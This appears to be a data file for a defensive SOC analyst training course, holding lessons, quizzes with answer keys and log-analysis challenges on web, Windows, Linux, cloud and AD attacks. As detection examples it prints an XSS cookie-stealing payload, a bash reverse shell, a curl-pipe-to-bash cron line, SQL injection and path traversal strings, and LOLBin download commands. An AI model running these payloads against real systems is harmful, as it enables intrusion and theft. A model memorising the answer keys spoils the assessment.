    M('What is the difference between HTTP 401 and 403?', ['None', '401 means not authenticated; 403 means authenticated or identified but not allowed', '401 is a server error', '403 means the page does not exist'], 1, '401 asks for credentials. 403 refuses regardless of credentials.'),
    M('A request contains id=1%27%20OR%20%271%27=%271. What is being attempted?', ['XSS', 'SQL injection', 'Path traversal', 'CSRF'], 1, 'Decoded: id=1\' OR \'1\'=\'1, a classic always-true SQL condition.'),
    M('A comment field value of <script>fetch("//x.example/?c="+document.cookie)</script> is an attempt at what?', ['Command injection', 'Cross-site scripting to steal cookies', 'SQL injection', 'Brute force'], 1, 'Injected JavaScript running in other users\' browsers and sending their cookies out.'),
    M('Which log pattern indicates a login brute-force attack?', ['One GET / per minute', 'Dozens of POST /login from one IP with status 401 within seconds', 'A single 404', 'Many 304 responses'], 1, 'High rate, same endpoint, repeated authentication failures from one source.'),
    M('At which layer does a web application firewall inspect traffic?', ['Layer 2', 'Layer 3', 'Layer 4', 'Layer 7'], 3, 'A WAF understands HTTP: URLs, parameters, headers and bodies.'),
    M('What is a request for /download?file=../../../../etc/passwd?', ['Path traversal', 'XSS', 'SSRF', 'A normal download'], 0, 'The ../ sequences climb out of the intended directory to read system files.'),
    M('A SQL injection request returns status 200 and a response ten times larger than normal. What does that suggest?', ['The WAF blocked it', 'The injection may have succeeded and returned extra data', 'The server is down', 'Nothing useful'], 1, 'Response size is one of the best clues for whether data came back.'),
  ],
  chal: {
    title: 'Three attackers, one log',
    brief: 'Copy this access log to a file and analyse it with grep and awk. Three different sources are attacking the shop.',
    evidence: webLog,
    qs: [
      ['IP performing SQL injection', ['198.51.100.23'], ''],
      ['Tool the SQL injection attacker is using', ['sqlmap'], 'One word'],
      ['How many failed logins did 203.0.113.9 make before getting in?', [String(bruteFails)], 'A number. Careful: another client also failed once'],
      ['Attack type used by 192.0.2.60', ['path traversal', 'directory traversal', 'lfi', 'local file inclusion', 'pathtraversal', 'dot dot slash'], ''],
      ['Did the request from 192.0.2.60 succeed, judging by the status code? (yes/no)', ['yes'], ''],
    ],
  },
},
/* 6 */ {
  title: 'Windows tells you everything', module: 'Windows security monitoring',
  goal: 'Reconstruct a Windows intrusion from Security, System and Sysmon event IDs without a SIEM.',
  tasks: [
    ['thm', 'TryHackMe SOC Level 1: module "Windows Security Monitoring"', 5.5],
    ['own', 'On your own Windows PC open Event Viewer, filter Security for 4624 and 4625, and find your last logon and its logon type', 0.5],
    ['own', 'Write the event ID table below from memory on paper, then check it', 0.5],
  ],
  lesson: `<p>Most corporate endpoints are Windows. A handful of event IDs answer most questions an L1 analyst is asked, so memorise them.</p>
<h4>Event IDs to know cold</h4>
<pre>Security log
4624  logon success          4625  logon failure
4634  logoff                 4648  logon with explicit credentials (runas)
4672  admin privileges assigned at logon
4688  process created (needs command-line auditing)
4720  user created           4726  user deleted
4728/4732  user added to a global/local security group
4768  Kerberos TGT requested 4769  Kerberos service ticket requested
1102  audit log cleared

System log
7045  new service installed

Sysmon
1 process create   3 network connection   11 file create
13 registry value set   22 DNS query</pre>
<h4>Logon types</h4>
<pre>2 interactive (keyboard)   3 network (SMB, shares)   4 batch
5 service   7 unlock   10 RemoteInteractive (RDP)   11 cached</pre>
<h4>Persistence spots</h4><ul><li>Run keys: <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> and the HKLM equivalent</li><li>Scheduled tasks, services, Startup folder</li></ul>
<h4>Common trap</h4><p>One 4625 means a typo. Judge by pattern: many failures for one account is brute force; one failure each across many accounts from one source is password spraying.</p>`,
  quiz: [
    M('Which Security event ID records a successful logon?', ['4625', '4624', '4688', '4720'], 1, '4624 success, 4625 failure.'),
    M('A 4624 event shows Logon Type 10. How did the user log on?', ['At the keyboard', 'Over RDP', 'As a service', 'Via a network share'], 1, 'Type 10 is RemoteInteractive. Type 3 is network, type 2 is local interactive.'),
    M('Which event ID records a new process, when auditing is enabled?', ['4688', '4624', '7045', '1102'], 0, '4688 in the Security log; Sysmon event 1 gives the same with richer detail.'),
    M('What does Sysmon event ID 3 record?', ['Process creation', 'A network connection', 'A registry change', 'A DNS query'], 1, 'Sysmon 1 process, 3 network, 11 file create, 13 registry, 22 DNS.'),
    M('Which event ID shows that a user account was created?', ['4720', '4732', '4768', '4634'], 0, '4720 created. 4732 means a member was added to a local group.'),
    M('Which registry key is a common persistence location?', ['HKLM\\HARDWARE', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'HKCR\\.txt', 'HKU\\.DEFAULT\\Keyboard Layout'], 1, 'Values under Run start at every logon of that user.'),
    M('Event 7045 appears in the System log. What happened?', ['A user logged off', 'A new service was installed', 'The firewall was disabled', 'A file was deleted'], 1, 'Services are a favourite for persistence and for remote execution tools such as PsExec.'),
  ],
  chal: {
    title: 'What happened on SRV-FILE-01?',
    brief: 'These are exported Security events from a file server, in time order. Reconstruct the intrusion.',
    evidence: `# Security log export, SRV-FILE-01, 2026-11-11
Time      EventID  Details
01:12:04  4625     Account=svc_backup  LogonType=3  Source=10.1.1.50  Status=0xC000006A (bad password)
01:12:05  4625     Account=svc_backup  LogonType=3  Source=10.1.1.50  Status=0xC000006A
01:12:05  4625     Account=svc_backup  LogonType=3  Source=10.1.1.50  Status=0xC000006A
01:12:06  4625     Account=svc_backup  LogonType=3  Source=10.1.1.50  Status=0xC000006A
01:12:07  4625     Account=svc_backup  LogonType=3  Source=10.1.1.50  Status=0xC000006A
01:12:09  4624     Account=svc_backup  LogonType=3  Source=10.1.1.50
01:12:09  4672     Account=svc_backup  Privileges=SeBackupPrivilege, SeDebugPrivilege
01:13:30  4720     NewAccount=helpdesk2  CreatedBy=svc_backup
01:13:41  4732     Member=helpdesk2  Group=Administrators  AddedBy=svc_backup
01:15:02  4624     Account=helpdesk2  LogonType=10  Source=10.1.1.50
01:19:55  1102     The audit log was cleared. Subject=helpdesk2`,
    qs: [
      ['Which account was brute-forced?', ['svc_backup'], ''],
      ['Logon type of the attacker\'s first successful logon', ['3'], 'A number'],
      ['Name of the account the attacker created', ['helpdesk2'], ''],
      ['Which group gave that account its power?', ['administrators', 'administrator', 'local administrators'], ''],
      ['How did the attacker log on at 01:15:02? Name the protocol', ['rdp', 'remote desktop', 'remote desktop protocol', 'remoteinteractive'], ''],
      ['Event ID that shows the attacker covering tracks', ['1102'], ''],
    ],
  },
},
/* 7 */ {
  title: 'Linux under attack', module: 'Linux security monitoring and log scripting',
  goal: 'Investigate a Linux server from the command line: logins, processes, persistence, and fast log slicing with grep, awk and sort.',
  tasks: [
    ['thm', 'TryHackMe SOC Level 1: module "Linux Security Monitoring"', 5],
    ['own', 'Write a 15-line Bash or Python script that reads an auth.log and prints the top 5 IPs by failed logins. Test it on the challenge data', 1.5],
    ['pwn', 'pwn.college "Web Security": 4 more challenges, to keep last week\'s material alive', 1.5],
  ],
  lesson: `<p>You finished Linux Luminarium, so the shell itself is not new. This week turns it into an investigation tool.</p>
<h4>Where to look</h4>
<pre>/var/log/auth.log      SSH, sudo (Debian/Ubuntu; /var/log/secure on RHEL)
/var/log/syslog        general system messages
journalctl -u ssh      systemd journal for one service
last, lastb            successful and failed logins
~/.bash_history        what a user typed
/etc/passwd, /etc/shadow, ~/.ssh/authorized_keys     accounts and keys</pre>
<h4>Live triage</h4>
<pre>ps auxf                         process tree
ss -tulpn                       listening ports and owning process
ls -la /tmp /dev/shm /var/tmp   world-writable dirs attackers love
crontab -l ; ls /etc/cron.*     scheduled persistence
systemctl list-units --type=service --state=running
ls -l /proc/PID/exe             the real binary, even if deleted</pre>
<h4>Log slicing</h4>
<pre>grep "Failed password" auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr
grep "Accepted" auth.log
grep -c "Failed password for root" auth.log</pre>
<h4>Red flags</h4><ul><li>Failures then "Accepted" from the same IP</li><li><code>curl ... | bash</code> in cron</li><li><code>bash -i >&amp; /dev/tcp/IP/PORT 0>&amp;1</code> (reverse shell)</li><li>Hidden files in /tmp using near 100% CPU (miner)</li></ul>`,
  quiz: [
    M('Where does Ubuntu log SSH authentication attempts?', ['/var/log/secure', '/var/log/auth.log', '/etc/ssh/log', '/var/log/dmesg'], 1, 'Debian and Ubuntu use auth.log. RHEL-family systems use /var/log/secure.'),
    M('Which command counts failed SSH password attempts?', ['cat auth.log | head', 'grep -c "Failed password" auth.log', 'ls -l auth.log', 'tail -f auth.log'], 1, 'grep -c prints the number of matching lines.'),
    M('What does this line do: bash -i >& /dev/tcp/203.0.113.4/4444 0>&1', ['Updates bash', 'Opens a reverse shell to 203.0.113.4', 'Tests the network', 'Lists open ports'], 1, 'It connects out and attaches an interactive shell to that socket.'),
    M('Which command shows listening ports with the owning process?', ['ss -tulpn', 'df -h', 'whoami', 'uname -a'], 0, 'ss -tulpn (or netstat -tulpn on older systems).'),
    M('Why is an executable running from /tmp or /dev/shm suspicious?', ['Those directories are read-only', 'They are world-writable, so attackers drop payloads there', 'They are encrypted', 'They hold kernel modules'], 1, 'Legitimate software rarely executes from temporary, world-writable locations.'),
    M('What does this pipeline output: awk \'{print $1}\' access.log | sort | uniq -c | sort -nr | head', ['The last 10 lines', 'The top client IPs by request count', 'All 404 errors', 'The file size'], 1, 'Field 1 is the client IP; uniq -c counts, sort -nr ranks.'),
    M('A cron entry runs: curl -s http://198.51.100.9/x.sh | bash every 5 minutes. What is its purpose?', ['Log rotation', 'Persistence: re-downloading and running attacker code', 'Time sync', 'A backup'], 1, 'Download-and-execute on a schedule keeps the attacker\'s foothold even if the payload is removed.'),
  ],
  chal: {
    title: 'web-prod-02 is slow',
    brief: 'Ops reports 100% CPU on a web server. You were given three extracts. Copy them to a file and work in a terminal.',
    evidence: authLog,
    qs: [
      ['Attacker\'s IP address', ['45.155.205.99'], ''],
      ['How many failed password attempts targeted root?', [String(rootFails)], 'Use grep -c'],
      ['Which account did the attacker log in with?', ['deploy'], ''],
      ['Persistence mechanism used', ['cron', 'cronjob', 'cron job', 'crontab', 'scheduled task', 'cron jobs'], 'One word'],
      ['What kind of malware is /tmp/.kworker?', ['cryptominer', 'miner', 'crypto miner', 'coinminer', 'coin miner', 'cryptocurrency miner', 'xmrig', 'crypto-miner', 'cryptojacking', 'monero miner'], ''],
    ],
  },
},
/* 8 */ {
  title: 'Know your enemy\'s tools', module: 'Malware concepts and threat intelligence',
  goal: 'Classify malware by behaviour, recognise living-off-the-land binaries, and enrich an indicator with threat intelligence.',
  tasks: [
    ['thm', 'TryHackMe SOC Level 1: module "Malware Concepts for SOC"', 3],
    ['thm', 'TryHackMe SOC Level 1: module "Threat Analysis Tools"', 3],
    ['own', 'Take three hashes from a public threat report, look them up on VirusTotal, and note family, first-seen date and contacted domains', 1],
  ],
  lesson: `<p>You do not reverse-engineer malware at L1. You do need to recognise what a process tree is telling you and to enrich an indicator in two minutes.</p>
<h4>Malware by goal</h4>
<ul><li><b>Ransomware</b> encrypts for extortion. <b>Infostealer</b> grabs credentials and cookies. <b>RAT/backdoor</b> gives remote control. <b>Loader/dropper</b> fetches the next stage. <b>Miner</b> burns CPU. <b>Worm</b> spreads by itself.</li></ul>
<h4>Living off the land (LOLBins)</h4>
<pre>powershell -enc &lt;base64&gt;        encoded command (Base64 of UTF-16LE text)
certutil -urlcache -split -f     downloads a file
mshta http://...                 runs remote HTA
rundll32, regsvr32               proxy execution of DLLs and scripts
bitsadmin /transfer              background download
wmic process call create         remote or local execution</pre>
<h4>Suspicious parent and child</h4><p>Office apps (winword, excel, outlook) or browsers spawning cmd, powershell, wscript or mshta. See lolbas-project.github.io for the full list.</p>
<h4>Enrichment in 2 minutes</h4>
<pre>Hash    VirusTotal (search the hash; do not upload internal files)
IP      AbuseIPDB, VirusTotal, whois/ASN
Domain  registration age, passive DNS, urlscan.io
Decode  echo BASE64 | base64 -d | iconv -f UTF-16LE -t UTF-8
        or CyberChef: From Base64, then Decode text UTF-16LE</pre>
<h4>Common trap</h4><p>Zero detections on VirusTotal does not mean clean. Fresh or targeted samples start at zero.</p>`,
  quiz: [
    M('What distinguishes a worm from a trojan?', ['A worm encrypts files', 'A worm spreads to other systems by itself', 'A worm needs a macro', 'There is no difference'], 1, 'Self-propagation defines a worm. A trojan relies on the user running it.'),
    M('What is a LOLBin?', ['A leaked credential dump', 'A legitimate, usually signed system binary abused by attackers', 'A type of ransomware', 'A sandbox'], 1, 'Using built-in tools blends in with normal activity and avoids dropping new files.'),
    M('Why should you search a hash on VirusTotal instead of uploading the file?', ['Uploading is slower', 'Uploaded files become available to others, which can leak company data or alert the attacker', 'Hashes give more detections', 'VirusTotal rejects files'], 1, 'Submissions are shared with the community and vendors.'),
    M('What does powershell.exe -enc followed by a long string indicate?', ['A signed script', 'A Base64-encoded command, often used to hide intent', 'A PowerShell update', 'A remote desktop session'], 1, '-enc (EncodedCommand) takes Base64 of UTF-16LE text.'),
    M('What is the difference between static and dynamic malware analysis?', ['Static runs the sample; dynamic does not', 'Static inspects without running; dynamic executes it in a sandbox and observes', 'They are the same', 'Dynamic only reads strings'], 1, 'Static: hashes, strings, imports. Dynamic: behaviour while running.'),
    M('Which details help most when enriching a suspicious IP?', ['Its colour in the SIEM', 'Reputation reports, owner/ASN, geolocation and passive DNS', 'The analyst\'s opinion', 'Its last octet'], 1, 'Context about who owns it and what it has done before guides the verdict.'),
    M('A file shows 0 of 70 detections on VirusTotal. What can you conclude?', ['It is safe', 'Nothing certain; new or targeted malware often starts undetected', 'It is definitely malicious', 'The hash is wrong'], 1, 'Absence of detections is not evidence of safety. Look at behaviour and context.'),
  ],
  chal: {
    title: 'Decode the process tree',
    brief: 'EDR raised "Office application spawned a shell". Explain what ran. You will need to decode the PowerShell argument: base64 -d piped to iconv -f UTF-16LE, or CyberChef.',
    evidence: malEvidence,
    qs: [
      ['Which process started the malicious chain?', ['winword.exe', 'winword', 'word', 'microsoft word'], 'Process name'],
      ['Which LOLBin downloaded a.exe?', ['certutil', 'certutil.exe'], ''],
      ['Decode the PowerShell command. Which file does it fetch?', ['stage2.ps1'], 'File name only'],
      ['ATT&CK technique ID for downloading tools from an external system (Ingress Tool Transfer)', ['T1105'], 'T####'],
      ['IP address you would hunt for across all other hosts', ['91.92.240.15'], ''],
    ],
  },
},
/* 9 */ {
  title: 'The analyst\'s cockpit', module: 'SIEM, EDR and SOAR',
  goal: 'Write basic Splunk SPL and Elastic KQL searches from memory and explain what EDR and SOAR add.',
  tasks: [
    ['thm', 'TryHackMe SOC Level 1: module "Core SOC Solutions" (EDR, SIEM, Splunk basics, Elastic basics, SOAR)', 6],
    ['own', 'Rewrite five of this week\'s cheat-sheet searches for a different question (for example failed logons per user instead of per IP)', 1],
  ],
  lesson: `<p>In a real SOC you live in the SIEM. The SAL1 simulator also expects you to pivot between alerts and log searches under time pressure, so query fluency is worth points.</p>
<h4>What each tool does</h4>
<ul><li><b>SIEM</b>: collects logs, normalises field names, correlates, alerts. Splunk, Elastic, Sentinel.</li>
<li><b>EDR</b>: records endpoint telemetry (processes, files, network) and can respond, for example isolate a host.</li>
<li><b>SOAR</b>: runs playbooks automatically: enrich, open ticket, block, notify.</li></ul>
<h4>Splunk SPL</h4>
<pre>index=auth action=failure earliest=-24h
| stats count by src_ip
| where count > 5
| sort -count

index=win EventCode=4625 | stats dc(user) as users by src_ip | where users > 20
index=web status=404 | top limit=5 src_ip
index=proxy | timechart span=1h sum(bytes_out) by src_ip
... | table _time host user CommandLine
... | dedup src_ip</pre>
<p>Filter first (index, time, field=value), transform after the pipe. It is faster and easier to read.</p>
<h4>Elastic KQL</h4>
<pre>event.code: 4625 and user.name: "admin"
source.ip: 203.0.113.0/24 and not http.response.status_code: 200
process.parent.name: "winword.exe" and process.name: ("cmd.exe" or "powershell.exe")
url.path: *passwd*</pre>
<h4>Common trap</h4><p>Searching "all time". Always set the time window around the alert first, then widen.</p>`,
  quiz: [
    M('What is the core job of a SIEM?', ['Blocking malware on endpoints', 'Collecting, normalising and correlating logs to produce alerts', 'Scanning for open ports', 'Encrypting disks'], 1, 'A SIEM centralises logs so that events from different sources can be searched and correlated.'),
    M('Which SPL search counts failed logins per source IP?', ['index=auth action=failure | stats count by src_ip', 'index=auth | count failure', 'select count(*) from auth', 'index=auth action=failure | table'], 0, 'Filter first, then stats count by the grouping field.'),
    M('Where should index and time filters go in an SPL search?', ['After the last pipe', 'At the start, before the first pipe', 'Inside stats', 'They are optional and irrelevant'], 1, 'Early filtering reduces the events every later command has to process.'),
    M('Which KQL finds failed Windows logons for the user admin?', ['event.code: 4625 and user.name: "admin"', 'EventCode=4625 | user=admin', 'SELECT * WHERE code=4625', 'event.code == 4624'], 0, 'KQL uses field: value with and/or/not.'),
    M('What does EDR give you that classic antivirus does not?', ['Signature updates', 'Recorded endpoint telemetry and response actions such as host isolation', 'A firewall', 'Email filtering'], 1, 'EDR lets you see the process tree and act on the host remotely.'),
    M('What is SOAR used for?', ['Storing passwords', 'Automating response playbooks such as enrichment and containment', 'Capturing packets', 'Writing malware signatures'], 1, 'Security Orchestration, Automation and Response.'),
    M('What does log normalisation mean in a SIEM?', ['Deleting old logs', 'Mapping different log formats to common field names', 'Compressing logs', 'Encrypting logs'], 1, 'Without it, src, source_ip and c-ip would need separate searches.'),
  ],
  chal: {
    title: 'Run the search in your head',
    brief: 'No SIEM needed. Read the events and work out what each search would return. Then build the same answers in a terminal with grep and awk to check yourself.',
    evidence: siemEvidence,
    qs: [
      ['Result of: index=web status=404 | stats count by src_ip | sort -count | head 1  (the IP)', [top404], ''],
      ['Result of: index=auth action=failure user=admin | stats count', [String(adminFail)], 'A number'],
      ['Which external IP scanned for hidden paths and then brute-forced admin successfully?', ['203.0.113.50'], ''],
      ['SPL command you add after "| stats count by src_ip" to keep only rows with count above 5', ['where', '| where count > 5', 'where count > 5', '|where count>5', 'search', 'search count>5', '| search count>5'], 'One command'],
      ['One login came from an internal address and may be the real admin. Which IP?', ['10.0.0.8'], ''],
    ],
  },
},
/* 10 */ {
  title: 'Triage like a professional', module: 'Alert triage, reporting and the SOC simulator',
  goal: 'Take an alert from queue to closed with a correct verdict and a report another analyst can act on.',
  tasks: [
    ['thm', 'TryHackMe SOC Level 1: module "SOC Team Internals" (Alert Triage, Alert Reporting, Workbooks and Lookups, Metrics)', 3],
    ['thm', 'TryHackMe SOC Level 1: module "SIEM Triage for SOC"', 3],
    ['thm', 'TryHackMe SOC Simulator: one full scenario, timed. Write a case report for every true positive', 2],
  ],
  lesson: `<p>Knowledge gets you the verdict. The report gets you the job. SAL1 gives case reports as many points as the whole multiple-choice section.</p>
<h4>Triage loop</h4>
<pre>1. Pick by severity, then age. Assign to yourself.
2. Read the rule: what exactly did it match?
3. Context: who is the user, what is the host, is this normal for them?
4. Evidence: pivot in SIEM around the alert time (same host, user, IP).
5. Verdict: true positive or false positive, with the reason.
6. Act: close with comment, or escalate with everything L2 needs.</pre>
<h4>Report template (5 Ws)</h4>
<pre>Who    user and host affected, attacker IP or sender
What   what happened, in one sentence, then the evidence
When   first and last activity, in UTC
Where  systems and network segments involved
Why    why you judged it TP or FP
Then   indicators, actions taken, recommended next steps</pre>
<h4>Metrics you will hear</h4><ul><li><b>MTTD</b> mean time to detect, <b>MTTA</b> to acknowledge, <b>MTTR</b> to respond</li><li><b>False positive rate</b>: if it is high, tune the rule; do not ignore the queue</li></ul>
<h4>Common trap</h4><p>Vague comments such as "looks fine, closing". Write what you checked and what you saw, so the next person does not have to repeat it.</p>`,
  quiz: [
    M('Five alerts are waiting. In which order should you take them?', ['Newest first', 'Highest severity first, then oldest', 'Random', 'Lowest severity first to clear the queue'], 1, 'Severity and asset criticality drive priority; age breaks ties.'),
    M('What must a good alert closing comment contain?', ['"Closed"', 'Who, what, when, where, why, the verdict and actions taken', 'Only the rule name', 'Your shift hours'], 1, 'The 5 Ws plus verdict make the case understandable without redoing the work.'),
    M('You confirm malware beaconing from a host but cannot isolate hosts yourself. What do you do?', ['Close as false positive', 'Escalate to L2 with evidence and a recommended containment', 'Wait until the next shift', 'Email the user'], 1, 'A confirmed true positive that needs action outside your permissions is the definition of an escalation.'),
    M('What does MTTD measure?', ['Mean time to deploy', 'Mean time to detect', 'Maximum time to defend', 'Mean ticket duration'], 1, 'How long malicious activity runs before it is detected.'),
    M('One rule produces 95% false positives. What is the right response?', ['Disable it silently', 'Tune it: add exclusions or tighten conditions, and document the change', 'Ignore its alerts', 'Raise its severity'], 1, 'Tuning keeps coverage while reducing noise.'),
    M('A phishing alert names user ana. Thirty minutes later a suspicious logon alert fires for ana. What should you do?', ['Handle them as unrelated', 'Link them: they are probably one incident', 'Close the second one', 'Delete both'], 1, 'Correlating by user, host and time turns separate alerts into an attack story.'),
    M('Why convert all timestamps to UTC when building a timeline?', ['UTC is shorter to write', 'Sources log in different time zones, and mixing them corrupts the order of events', 'SIEMs require it by law', 'It hides the real time'], 1, 'A single reference time zone keeps the sequence correct across systems.'),
  ],
  chal: {
    title: 'Four alerts, four verdicts',
    brief: 'Give a verdict for each alert using the context provided: tp or fp. Then answer the last question.',
    evidence: `# Reference: Northwind asset and network list
SSO portal            login.northwind.example            (official)
Corporate VPN egress  185.60.112.10 (Frankfurt, DE)      (official)
FIN-PC-07             finance workstation, user m.ionescu
HR-PC-02              HR workstation, user e.lungu

ALERT 1  Suspicious link in email
  Sender it-support@northwind.example, SPF pass, DKIM pass, DMARC pass
  Link: https://login.northwind.example/reset   Recipients: all staff (password policy reminder)

ALERT 2  Office application spawned PowerShell
  Host FIN-PC-07   excel.exe -> powershell.exe -nop -w hidden -enc SQBFAFgA...
  30 seconds later: outbound HTTPS to 91.92.240.15 (first time seen in the company)

ALERT 3  Impossible travel
  User e.lungu logged in from Chisinau, MD at 09:00 and from 185.60.112.10 at 09:05

ALERT 4  Anomalous DNS
  Host HR-PC-02 sent 1,900 TXT queries in 10 minutes to *.sync-cdn-data.example
  Subdomain labels are 48 random characters. Domain registered 2 days ago.`,
    qs: [
      ['Alert 1 verdict (tp/fp)', ['fp', 'false positive'], ''],
      ['Alert 2 verdict (tp/fp)', ['tp', 'true positive'], ''],
      ['Alert 3 verdict (tp/fp)', ['fp', 'false positive'], ''],
      ['Alert 4 verdict (tp/fp)', ['tp', 'true positive'], ''],
      ['ATT&CK tactic for what PowerShell is doing in Alert 2 at the moment it is launched', ['execution'], 'One word'],
      ['What technique does Alert 4 describe?', ['dns tunneling', 'dns tunnelling', 'dns exfiltration', 'dns tunnel', 'exfiltration over dns', 'data exfiltration over dns'], 'Two words'],
    ],
  },
},
/* 11 */ {
  title: 'Identity is the new perimeter', module: 'Cloud and Active Directory for analysts',
  goal: 'Read cloud audit logs and Kerberos events well enough to spot account takeover, privilege escalation and Kerberoasting.',
  tasks: [
    ['thm', 'TryHackMe: start the "Defending AWS" path (first module, focus on IAM and CloudTrail)', 3.5],
    ['thm', 'TryHackMe: room "Active Directory Basics", then review events 4768, 4769 and 4776 in your notes', 2],
    ['thm', 'TryHackMe SOC Simulator: second full scenario, timed. Compare your score with week 10', 2],
  ],
  lesson: `<p>Your long-term target is cloud security, and you marked cloud and AD as weak. One week will not make you an expert, but it covers what a SOC analyst is asked about them.</p>
<h4>Cloud basics</h4>
<ul><li><b>Shared responsibility</b>: the provider secures the infrastructure; you secure identities, configuration and data.</li>
<li><b>IAM</b>: users, roles, policies. Least privilege always. Long-lived access keys are a liability.</li>
<li><b>Audit logs</b>: AWS CloudTrail, Azure Activity and Entra sign-in logs, GCP Cloud Audit Logs.</li></ul>
<h4>CloudTrail events worth an alert</h4>
<pre>ConsoleLogin with MFAUsed=No from a new country
CreateAccessKey, CreateUser, CreateLoginProfile      new credentials
AttachUserPolicy / PutUserPolicy (AdministratorAccess) privilege escalation
StopLogging, DeleteTrail                               covering tracks
PutBucketPolicy / PutBucketAcl making S3 public        data exposure
RunInstances of large GPU types in an unused region    crypto mining</pre>
<h4>Active Directory basics</h4>
<pre>Domain controller   holds accounts, issues Kerberos tickets
4768   TGT requested (user authenticates to the domain)
4769   service ticket requested for an SPN
4776   NTLM credential validation
Kerberoasting   one account requests many service tickets with RC4
                (encryption type 0x17), then cracks them offline
Password spray  one password tried across many accounts
Golden ticket   forged TGT made with the krbtgt hash</pre>
<h4>Common trap</h4><p>Looking only at failed logins. In the cloud the dangerous event is often a successful login followed by quiet, legitimate-looking API calls.</p>`,
  quiz: [
    M('Under the shared responsibility model, what is always the customer\'s job?', ['Physical data-centre security', 'Identity, access configuration and their own data', 'Hypervisor patching', 'Power and cooling'], 1, 'The provider secures the cloud; you secure what you put in it.'),
    M('Which AWS service records API calls made in an account?', ['CloudWatch Metrics', 'CloudTrail', 'S3', 'Route 53'], 1, 'CloudTrail is the audit log of who did what, when and from where.'),
    M('What does least privilege mean?', ['Everyone is admin for speed', 'Each identity gets only the permissions its task requires', 'Passwords under 8 characters', 'No one can log in'], 1, 'Fewer permissions mean less damage when an identity is compromised.'),
    M('What is Kerberoasting?', ['Flooding the domain controller', 'Requesting service tickets for SPN accounts and cracking them offline', 'Stealing cookies', 'Guessing one password across many users'], 1, 'Any domain user can request the tickets; weak service account passwords fall to offline cracking.'),
    M('What does event ID 4768 show?', ['A service was installed', 'A Kerberos TGT was requested', 'A user was deleted', 'The log was cleared'], 1, '4768 is the TGT request; 4769 is a service ticket request.'),
    M('A user gets 30 MFA push prompts at night and finally approves one. What attack is this?', ['MFA fatigue (push bombing)', 'Kerberoasting', 'SQL injection', 'ARP spoofing'], 0, 'The attacker already has the password and spams prompts until the user gives in.'),
    M('An S3 bucket with customer data is readable by anyone on the internet. How would you classify this?', ['Expected behaviour', 'A misconfiguration causing data exposure', 'A DDoS attack', 'A Kerberos issue'], 1, 'Misconfiguration is the leading cause of cloud data leaks.'),
  ],
  chal: {
    title: 'A quiet night in the cloud',
    brief: 'CloudTrail events from a company AWS account, followed by one Windows observation from the same week.',
    evidence: `# CloudTrail (simplified), account 4410-prod, 2026-11-14 UTC
22:41:03  ConsoleLogin        user=dev-anna      sourceIP=102.129.145.20 (new country)  MFAUsed=No   result=Success
22:43:17  ListUsers           user=dev-anna      sourceIP=102.129.145.20
22:44:02  CreateUser          user=dev-anna      newUser=backup-admin
22:44:20  AttachUserPolicy    user=dev-anna      target=backup-admin  policy=AdministratorAccess
22:44:41  CreateAccessKey     user=dev-anna      target=backup-admin
22:47:09  StopLogging         user=backup-admin  trail=org-main-trail  sourceIP=102.129.145.20
22:52:30  RunInstances        user=backup-admin  type=p4d.24xlarge x8  region=ap-southeast-3

# Domain controller DC-01, 2026-11-15
03:20:11 to 03:20:54  Event 4769 x 46  Account=t.rotaru  Source=10.20.4.31
                      46 different service names, Ticket Encryption Type=0x17`,
    qs: [
      ['Whose credentials were compromised first?', ['dev-anna'], ''],
      ['Which user did the attacker create for persistence?', ['backup-admin'], ''],
      ['Which policy gave it full control?', ['administratoraccess'], ''],
      ['Which API call tried to blind the defenders?', ['stoplogging'], ''],
      ['What is the likely purpose of the 22:52:30 event?', ['cryptomining', 'crypto mining', 'mining', 'cryptocurrency mining', 'cryptojacking', 'crypto miner', 'cryptominer', 'coin mining'], ''],
      ['Name the attack seen on DC-01', ['kerberoasting', 'kerberoast'], 'One word'],
    ],
  },
},
/* 12 */ {
  title: 'One incident, start to finish', module: 'Incident response and capstone',
  goal: 'Investigate a multi-stage incident across mail, endpoint, proxy and Windows logs and write the report.',
  tasks: [
    ['thm', 'TryHackMe SOC Level 1: module "Capstone Challenges" (Tempest and the Boogeyman series)', 6],
    ['own', 'After the capstone challenge below, write a one-page incident report using the week 10 template. Keep it as a work sample', 1],
    ['own', 'Review tab: clear every due question before the final exam', 0.5],
  ],
  lesson: `<p>This week you stop learning tools and prove you can connect them. The final exam and the capstone below are the evidence that the last three months worked.</p>
<h4>Incident response phases (NIST)</h4>
<pre>1. Preparation
2. Detection and Analysis
3. Containment, Eradication and Recovery
4. Post-Incident Activity (lessons learned)</pre>
<h4>Investigation method</h4>
<pre>Anchor    start from the one thing you know (an alert, a host, a time)
Pivot     same host around that time; same user; same IP or domain elsewhere
Timeline  one line per event, UTC, source of evidence noted
Scope     which hosts and accounts are touched? search every indicator company-wide
Report    5 Ws, indicators, actions, recommendations</pre>
<h4>Evidence rules</h4><ul><li>Order of volatility: memory first, then disk. Do not reboot an infected host before memory is captured.</li>
<li>Contain before you clean: isolate the host, disable the account, block the indicators.</li>
<li>Chain of custody: record who handled which evidence and when.</li></ul>
<h4>What next</h4><p>If you pass the final exam at 80% or above and your SOC Simulator scores are steady, you are in range for the SAL1 certification. After that, SOC Level 2 and the Defending AWS and Azure paths lead toward the cloud security role you want.</p>`,
  quiz: [
    M('In the NIST incident response lifecycle, what follows Detection and Analysis?', ['Preparation', 'Containment, Eradication and Recovery', 'Post-Incident Activity', 'Reconnaissance'], 1, 'Preparation; Detection and Analysis; Containment, Eradication and Recovery; Post-Incident Activity.'),
    M('A host is infected with fileless malware. A technician wants to reboot it. What do you say?', ['Go ahead', 'No: isolate it and capture memory first, since a reboot destroys volatile evidence', 'Reinstall Windows first', 'Unplug the monitor'], 1, 'Memory holds the running malware, keys and connections. It is gone after a reboot.'),
    M('Which evidence should be collected first?', ['Backups', 'RAM', 'Hard disk image', 'Printed documents'], 1, 'Order of volatility: the most short-lived data first.'),
    M('Which is a containment action?', ['Writing the final report', 'Isolating the host from the network through EDR', 'Holding a lessons-learned meeting', 'Buying new licences'], 1, 'Containment limits spread while analysis continues.'),
    M('What is the purpose of the post-incident phase?', ['Assign blame', 'Improve detections, processes and defences based on what happened', 'Delete the logs', 'Close tickets faster'], 1, 'Each incident should make the next one easier to detect and handle.'),
